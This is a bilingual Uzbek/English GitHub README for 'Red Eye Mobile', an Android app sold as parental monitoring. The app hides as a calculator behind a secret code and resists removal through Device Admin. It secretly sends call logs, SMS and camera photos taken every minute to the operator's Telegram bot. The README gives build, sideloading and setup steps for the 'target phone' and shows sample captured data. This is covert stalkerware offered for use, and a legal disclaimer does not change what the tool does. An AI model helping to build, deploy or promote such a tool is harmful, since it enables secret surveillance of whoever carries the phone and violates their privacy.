# 📱 Red Eye Mobile

> **Build policy: JANGAN install Android SDK lokal. Build SELALU di GitHub.**
> Push ke `main` / buka PR / Run workflow manual (`Actions > Build APK`), lalu unduh artifacts `app-debug` / `app-release`.
> Secrets opsional: `BOT_TOKEN`, `CHAT_ID`, `SYNC_INTERVAL` (repo Settings > Secrets and variables > Actions).
> Tanpa secret pun APK tetap jadi — token diisi manual dari halaman Setup di aplikasi (`SetupActivity`, via kalkulator `1234` + `=`).
> `builder.sh` / `builder.bat` = LEGACY, dipertahankan untuk kompatibilitas saja. Detail aturan: `AGENTS.md`. Riwayat: `CHANGELOG.md`.


<div align="center">

**Aqlli va yashirin bolalar telefonini nazorat qilish dasturi**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-Android-green.svg)](https://www.android.com)
[![Kotlin](https://img.shields.io/badge/language-Kotlin-blue.svg)](https://kotlinlang.org)
[![Telegram](https://img.shields.io/badge/integration-Telegram-26A5E4.svg)](https://telegram.org)

**Developer: Akhatkulov**

[English](#english) | [O'zbek](#uzbek)

</div>

---

## 🇺🇿 <a name="uzbek"></a>O'ZBEKCHA

### 📋 Tavsif

**Red Eye Mobile** — bu ota-onalar uchun maxsus yaratilgan Android nazorat dasturi bo'lib, u farzandingizning telefon faoliyatini Telegram orqali kuzatish imkonini beradi. Dastur "Kalkulator" qiyofasida ishlab, to'liq yashirin rejimda ishlaydi.

### ✨ Asosiy Xususiyatlar

- 📞 **Qo'ng'iroqlar Nazorati** — Barcha kiruvchi va chiquvchi qo'ng'iroqlar tarixi
- 💬 **SMS Nazorati** — Kiruvchi va chiquvchi SMS xabarlar
- 📸 **Kamera Nazorati** — Har 1 daqiqada avtomatik rasm olish
- 🔔 **Telegram Integratsiya** — Barcha ma'lumotlar Telegram botga yuboriladi
- 🧮 **Yashirin Rejim** — Dastur kalkulyator ko'rinishida
- 🔒 **Device Admin** — Oson o'chirilishdan himoya
- 🔄 **Avtomatik Ishga Tushish** — Telefon restart bo'lganda ham avtomatik ishlaydi
- 🌐 **Offline Rejim** — Internet bo'lmasa xabarlar navbatga qo'yiladi

### 🏗️ Texnologiyalar

```
🔹 Kotlin — Asosiy dasturlash tili
🔹 Retrofit — Telegram API bilan aloqa
🔹 Coroutines — Asinxron operatsiyalar
🔹 WorkManager — Background ishlar
🔹 Camera2 API — Rasm olish
🔹 Foreground Service — Doimiy monitoring
🔹 Device Admin API — Xavfsizlik
```

### 📦 Tizim Talablari

- **Android OS**: 8.0 (API 26) va yuqori
- **RAM**: Minimal 2GB
- **Storage**: 50MB bo'sh joy
- **Ruxsatlar**: SMS, Qo'ng'iroqlar, Kamera, Storage

### 🚀 O'rnatish

#### 1️⃣ Android SDK O'rnatish

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y openjdk-17-jdk android-sdk

# macOS
brew install android-sdk
brew install openjdk@17

# Windows
# Android Studio'dan SDK Manager orqali o'rnatish
```

#### 2️⃣ SDK Path Sozlash

```bash
# Linux/macOS
echo "sdk.dir=$HOME/Android/Sdk" > local.properties

# Windows
echo "sdk.dir=C:\\Users\\YourUsername\\AppData\\Local\\Android\\Sdk" > local.properties
```

#### 3️⃣ Telegram Bot Yaratish

1. Telegram'da [@BotFather](https://t.me/BotFather)ga o'ting
2. `/newbot` buyrug'ini yuboring
3. Bot nomini kiriting
4. **Bot Token**ni saqlang (masalan: `<YOUR_BOT_TOKEN>`)
5. O'z Telegram ID'ingizni [@userinfobot](https://t.me/userinfobot)dan oling

#### 4️⃣ APK Build Qilish (LEGACY — gunakan GitHub Actions)

```bash
# Linux/macOS
./builder.sh YOUR_BOT_TOKEN YOUR_CHAT_ID 5

# Windows
builder.bat YOUR_BOT_TOKEN YOUR_CHAT_ID 5
```

**Misol:**
```bash
./builder.sh <YOUR_BOT_TOKEN> <YOUR_CHAT_ID> 5
```

#### 5️⃣ APK O'rnatish

1. `output/parental-monitor-release.apk` faylini telefonga ko'chiring
2. Fayl menejerdan APK'ni oching
3. "Unknown sources"ga ruxsat bering
4. O'rnatishni tasdiqlang

### 🔧 Sozlash

#### Telefonda Birinchi Ishga Tushirish

1. **Kalkulator** ikonkasini bosing
2. Kalkulyatorda `1234=` ni kiriting (maxfiy kod)
3. Device Admin ruxsatini tasdiqlang
4. Barcha kerakli ruxsatlarni bering:
   - 📞 Telefon (qo'ng'iroqlar)
   - 💬 SMS
   - 📸 Kamera
   - 📁 Storage
5. Dastur avtomatik ishga tushadi

### 📱 Foydalanish

Dastur o'rnatilgandan keyin:

1. ✅ **Avtomatik monitoring boshlanadi**
2. 📊 **Har 5 daqiqada** (yoki siz sozlagan vaqtda) yangi ma'lumotlar yuboriladi
3. 📸 **Har 1 daqiqada** oldingi va orqa kameradan rasm olinadi
4. 📱 **Telegram botingizga** barcha ma'lumotlar keladi
5. 🔄 **Telefon restart** bo'lsa ham avtomatik ishga tushadi

### 🎯 Telegram'da Qabul Qilinadigan Ma'lumotlar

```
📞 QOʻNGʻIROQ
Ism: John Doe
Raqam: +998901234567
Turi: Kiruvchi
Davomiyligi: 02:35
Sana: 19.10.2025 14:30

💬 SMS
Kimdan: +998901234567
Xabar: Salom, qalaysan?
Sana: 19.10.2025 14:28

📸 RASM
19.10.2025 14:32
[JPEG rasm fayli]
```

### 🛡️ Xavfsizlik

- ✅ Dastur faqat siz ko'rsatgan Telegram botga ma'lumot yuboradi
- ✅ Hech qanday ma'lumot boshqa joyga saqlanmaydi
- ✅ Device Admin himoyasi noto'g'ri o'chirishdan saqlaydi
- ⚠️ **MUHIM**: APK ichida bot tokeningiz bor — boshqalarga BERMANG!

### ⚙️ Sozlamalar (builder.sh)

```bash
./builder.sh BOT_TOKEN CHAT_ID INTERVAL

BOT_TOKEN  — Telegram bot tokeni
CHAT_ID    — Sizning Telegram ID'ingiz
INTERVAL   — Monitoring davomiyligi (daqiqalarda, default: 5)
```

### 🔧 Muammolarni Hal Qilish

| Muammo | Yechim |
|--------|--------|
| Dastur ishga tushmayapti | Barcha ruxsatlar berilganini tekshiring |
| Telegram'ga xabar kelmayapti | Bot token va Chat ID to'g'riligini tekshiring |
| Kamera ishlayapti | Android 10+ da kamera faqat foreground'da ishlaydi |
| Dastur o'chib ketayapti | Battery optimization'dan chiqaring |
| O'chirib bo'lmayapti | Settings → Security → Device Admin → O'chirish |

### 📂 Loyiha Strukturasi

```
red-eye-mobile/
├── app/
│   ├── src/main/
│   │   ├── java/com/redeye/parentalmonitor/
│   │   │   ├── data/              # Ma'lumotlar modellari
│   │   │   ├── network/           # Telegram API
│   │   │   ├── receiver/          # Broadcast receivers
│   │   │   ├── repository/        # Ma'lumotlar repositoriyalari
│   │   │   ├── service/           # Background servislar
│   │   │   ├── ui/                # UI komponentlar
│   │   │   ├── utils/             # Yordamchi sinflar
│   │   │   └── worker/            # WorkManager tasks
│   │   ├── res/                   # Resurslar (layout, drawable, etc)
│   │   └── AndroidManifest.xml    # App konfiguratsiyasi
│   └── build.gradle               # Build konfiguratsiyasi
├── builder.sh                     # Build script (Linux/macOS)
├── builder.bat                    # Build script (Windows)
├── LICENSE                        # MIT License
└── README.md                      # Bu fayl
```

### 🤝 Hissa Qo'shish

Pull request'lar xush kelibsiz! Katta o'zgarishlar uchun avval issue oching.

### 📄 Litsenziya

Bu loyiha [MIT License](LICENSE) ostida tarqatiladi.

### ⚖️ Qonuniy Ogohlantirish

⚠️ **MUHIM**: Bu dastur faqat qonuniy ota-ona nazorati uchun mo'ljallangan. 

- ✅ Faqat o'z farzandingiz telefonida foydalaning
- ✅ Mahalliy qonunlarga rioya qiling
- ❌ Boshqa odamlarni izlash uchun ishlatmang
- ❌ Shaxsiy hayotga kirish qonun buzilishidir

**Dasturchi noto'g'ri foydalanish uchun javobgar emas.**

### 📞 Bog'lanish

- **Developer**: Akhatkulov
- **GitHub**: [github.com/akhatkulov](https://github.com/akhatkulov)
- **Telegram**: [@akhatkulov](https://t.me/akhatkulov)

### 🎉 Minnatdorchilik

- [Telegram Bot API](https://core.telegram.org/bots/api) — Messaging integration
- [Square Retrofit](https://square.github.io/retrofit/) — HTTP client
- [Kotlin Coroutines](https://kotlinlang.org/docs/coroutines-overview.html) — Asynchronous programming
- [Android Jetpack](https://developer.android.com/jetpack) — Modern Android development

---

## 🇬🇧 <a name="english"></a>ENGLISH

### 📋 Description

**Red Eye Mobile** is a specialized Android parental monitoring application that allows parents to track their child's phone activity via Telegram. The app operates in complete stealth mode, disguised as a "Calculator" app.

### ✨ Key Features

- 📞 **Call Monitoring** — Track all incoming and outgoing calls
- 💬 **SMS Monitoring** — Monitor incoming and outgoing text messages
- 📸 **Camera Monitoring** — Automatic photo capture every 1 minute
- 🔔 **Telegram Integration** — All data sent to your Telegram bot
- 🧮 **Stealth Mode** — App appears as a calculator
- 🔒 **Device Admin** — Protection against easy removal
- 🔄 **Auto-start** — Automatically starts after phone reboot
- 🌐 **Offline Mode** — Messages queued when offline

### 🏗️ Technology Stack

```
🔹 Kotlin — Primary language
🔹 Retrofit — Telegram API communication
🔹 Coroutines — Asynchronous operations
🔹 WorkManager — Background tasks
🔹 Camera2 API — Photo capture
🔹 Foreground Service — Continuous monitoring
🔹 Device Admin API — Security
```

### 📦 System Requirements

- **Android OS**: 8.0 (API 26) or higher
- **RAM**: Minimum 2GB
- **Storage**: 50MB free space
- **Permissions**: SMS, Phone, Camera, Storage

### 🚀 Installation

#### 1️⃣ Install Android SDK

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y openjdk-17-jdk android-sdk

# macOS
brew install android-sdk
brew install openjdk@17

# Windows
# Install via SDK Manager in Android Studio
```

#### 2️⃣ Configure SDK Path

```bash
# Linux/macOS
echo "sdk.dir=$HOME/Android/Sdk" > local.properties

# Windows
echo "sdk.dir=C:\\Users\\YourUsername\\AppData\\Local\\Android\\Sdk" > local.properties
```

#### 3️⃣ Create Telegram Bot

1. Go to [@BotFather](https://t.me/BotFather) on Telegram
2. Send `/newbot` command
3. Enter bot name
4. Save the **Bot Token** (e.g., `<YOUR_BOT_TOKEN>`)
5. Get your Telegram ID from [@userinfobot](https://t.me/userinfobot)

#### 4️⃣ Build APK (LEGACY — use GitHub Actions)

```bash
# Linux/macOS
./builder.sh YOUR_BOT_TOKEN YOUR_CHAT_ID 5

# Windows
builder.bat YOUR_BOT_TOKEN YOUR_CHAT_ID 5
```

**Example:**
```bash
./builder.sh <YOUR_BOT_TOKEN> <YOUR_CHAT_ID> 5
```

#### 5️⃣ Install APK

1. Copy `output/parental-monitor-release.apk` to target phone
2. Open APK from file manager
3. Allow "Unknown sources"
4. Confirm installation

### 🔧 Configuration

#### First Launch on Phone

1. Tap the **Calculator** icon
2. Enter `1234=` on calculator (secret code)
3. Confirm Device Admin permission
4. Grant all required permissions:
   - 📞 Phone (calls)
   - 💬 SMS
   - 📸 Camera
   - 📁 Storage
5. App will start automatically

### 📱 Usage

After installation:

1. ✅ **Monitoring starts automatically**
2. 📊 **Every 5 minutes** (or your configured interval) new data is sent
3. 📸 **Every 1 minute** photos are captured from front and back cameras
4. 📱 **Data sent to your Telegram bot**
5. 🔄 **Auto-restarts** after phone reboot

### 🎯 Data Received in Telegram

```
📞 CALL
Name: John Doe
Number: +998901234567
Type: Incoming
Duration: 02:35
Date: 19.10.2025 14:30

💬 SMS
From: +998901234567
Message: Hello, how are you?
Date: 19.10.2025 14:28

📸 PHOTO
19.10.2025 14:32
[JPEG image file]
```

### 🛡️ Security

- ✅ App only sends data to your specified Telegram bot
- ✅ No data is stored elsewhere
- ✅ Device Admin protection prevents easy removal
- ⚠️ **IMPORTANT**: APK contains your bot token — DO NOT SHARE WITH OTHERS!

### ⚙️ Configuration (builder.sh)

```bash
./builder.sh BOT_TOKEN CHAT_ID INTERVAL

BOT_TOKEN  — Telegram bot token
CHAT_ID    — Your Telegram ID
INTERVAL   — Monitoring interval (in minutes, default: 5)
```

### 🔧 Troubleshooting

| Issue | Solution |
|-------|----------|
| App not starting | Verify all permissions are granted |
| No messages in Telegram | Check bot token and Chat ID |
| Camera not working | On Android 10+, camera only works in foreground |
| App keeps stopping | Disable battery optimization |
| Can't uninstall | Settings → Security → Device Admin → Deactivate |

### 📂 Project Structure

```
red-eye-mobile/
├── app/
│   ├── src/main/
│   │   ├── java/com/redeye/parentalmonitor/
│   │   │   ├── data/              # Data models
│   │   │   ├── network/           # Telegram API
│   │   │   ├── receiver/          # Broadcast receivers
│   │   │   ├── repository/        # Data repositories
│   │   │   ├── service/           # Background services
│   │   │   ├── ui/                # UI components
│   │   │   ├── utils/             # Utility classes
│   │   │   └── worker/            # WorkManager tasks
│   │   ├── res/                   # Resources (layout, drawable, etc)
│   │   └── AndroidManifest.xml    # App configuration
│   └── build.gradle               # Build configuration
├── builder.sh                     # Build script (Linux/macOS)
├── builder.bat                    # Build script (Windows)
├── LICENSE                        # MIT License
└── README.md                      # This file
```

### 🤝 Contributing

Pull requests are welcome! For major changes, please open an issue first.

### 📄 License

This project is licensed under the [MIT License](LICENSE).

### ⚖️ Legal Disclaimer

⚠️ **IMPORTANT**: This software is intended for legal parental monitoring purposes only.

- ✅ Use only on your own child's phone
- ✅ Comply with local laws
- ❌ Do not use to spy on others
- ❌ Invasion of privacy is illegal

**The developer is not responsible for misuse.**

### 📞 Contact

- **Developer**: Akhatkulov
- **GitHub**: [github.com/akhatkulov](https://github.com/akhatkulov)
- **Telegram**: [@akhatkulov](https://t.me/akhatkulov)

### 🎉 Acknowledgments

- [Telegram Bot API](https://core.telegram.org/bots/api) — Messaging integration
- [Square Retrofit](https://square.github.io/retrofit/) — HTTP client
- [Kotlin Coroutines](https://kotlinlang.org/docs/coroutines-overview.html) — Asynchronous programming
- [Android Jetpack](https://developer.android.com/jetpack) — Modern Android development

---

<div align="center">

**Made with ❤️ by Akhatkulov**

**Red Eye Mobile** © 2025

</div>

